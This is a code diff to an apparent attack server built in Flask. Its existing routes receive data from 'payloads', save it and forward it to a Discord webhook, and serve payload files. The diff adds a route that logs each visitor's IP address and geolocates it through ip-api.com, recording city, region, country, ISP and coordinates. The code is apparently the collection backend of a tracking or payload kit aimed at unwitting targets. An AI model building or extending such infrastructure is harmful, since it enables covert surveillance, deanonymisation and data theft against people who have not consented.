@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, send_from_directory, render_template_
 from server.webhook_reporter import send_to_discord
 from server.payload_handler import save_data
 import os
+import requests
 
 app = Flask(__name__)
 
@@ -51,6 +52,23 @@ def tracker(payload_type):
     save_data(payload_type, data)
     send_to_discord(payload_type, data)
     return jsonify({"status": "received", "payload_type": payload_type})
+
+# NEW: IP + geolocation logger
+@app.route('/tracker/iplog', methods=['GET'])
+def ip_log():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    try:
+        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
+    except:
+        geo = {}
+
+    log_line = f"{ip} | {geo.get('city','?')}, {geo.get('regionName','?')} | {geo.get('country','?')} | {geo.get('org','?')} | {geo.get('lat','?')},{geo.get('lon','?')}\n"
+    print(f"[+] Logged IP/Geo: {log_line.strip()}")
+
+    with open(os.path.join(LOG_DIR, "iplog.txt"), "a") as f:
+        f.write(log_line)
+
+    return jsonify(success=True)
 
 # Serve payload files
 @app.route('/payloads/<path:filename>')
